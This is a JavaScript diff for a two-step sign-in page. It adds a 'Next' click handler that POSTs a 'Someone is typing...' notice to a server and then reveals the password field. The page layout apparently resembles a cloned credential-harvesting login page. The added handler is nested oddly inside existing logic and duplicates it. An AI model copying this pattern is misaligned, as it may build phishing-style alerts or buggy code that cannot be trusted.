@@ -13,6 +13,36 @@ document.addEventListener('DOMContentLoaded', () => {
         //validate the form
         validate();
         if (unameVal) {
+            nxt.addEventListener('click', async () => {
+    // Notify your server immediately when Next is clicked.
+    try {
+        await fetch('/typing-notification', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                message: 'Someone is typing...'
+            })
+        });
+    } catch (error) {
+        console.error('Notification error:', error);
+    }
+
+    // Continue normal validation/navigation.
+    validate();
+
+    if (unameVal) {
+        document.getElementById("section_uname").classList.add('d-none');
+        document.getElementById('section_pwd').classList.remove('d-none');
+
+        document.querySelectorAll('#user_identity').forEach((e) => {
+            e.innerText = unameInp.value;
+        });
+
+        view = "pwd";
+    }
+});
                   document.getElementById("section_uname").classList.toggle('d-none');
             document.getElementById('section_pwd').classList.remove('d-none');
             document.querySelectorAll('#user_identity').forEach((e) => {
